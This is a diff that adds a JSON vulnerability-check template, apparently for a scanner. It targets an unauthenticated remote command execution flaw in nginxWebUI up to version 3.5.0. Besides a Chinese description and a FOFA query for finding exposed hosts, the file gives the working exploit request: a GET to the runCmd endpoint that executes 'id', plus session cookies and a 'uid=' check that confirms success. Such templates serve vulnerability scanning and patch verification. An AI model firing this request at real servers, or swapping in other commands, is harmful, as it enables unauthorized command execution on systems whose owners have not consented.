@@ -1,0 +1,37 @@
+{
+  "product": "nginxWebUI",
+  "vul_name": "nginxWebUI 前台远程命令执行",
+  "type": "命令执行",
+  "vul_id": [],
+  "level": 3,
+  "vul_desc": "nginxWebUI是一款网页版开源工具。 并且存在命令执行漏洞。攻击者可利用漏洞执行系统任意命令。",
+  "version": "nginxWebUI <= 3.5.0",
+  "note": "",
+  "search": {
+    "FOFA": "\"nginxWebUI\""
+  },
+  "protocol": "http",
+  "link": "https://blog.csdn.net/weixin_46944519/article/details/131622232",
+  "fix": [
+    "请关注厂商主页及时更新： https://www.nginxwebui.cn/"
+  ],
+  "logic": "and",
+  "exploit": {
+    "exp": {
+      "method": "get",
+      "follow": false,
+      "path": "/AdminPage/conf/runCmd?cmd=id%26%26echo%20nginx",
+      "cookie": "SOLONID=fc7679940b1743b3aee1d4d233913cc3; SOLONID2=69ddf221509a61bc6990d82d780db6b7; Hm_lvt_8acef669ea66f479854ecd328d1f348f=1688881500; Hm_lpvt_8acef669ea66f479854ecd328d1f348f=1688881500"
+    },
+    "verify": {
+      "path": "",
+      "logic": "and",
+      "check": [
+        {
+          "status": 200,
+          "body": "uid="
+        }
+      ]
+    }
+  }
+}
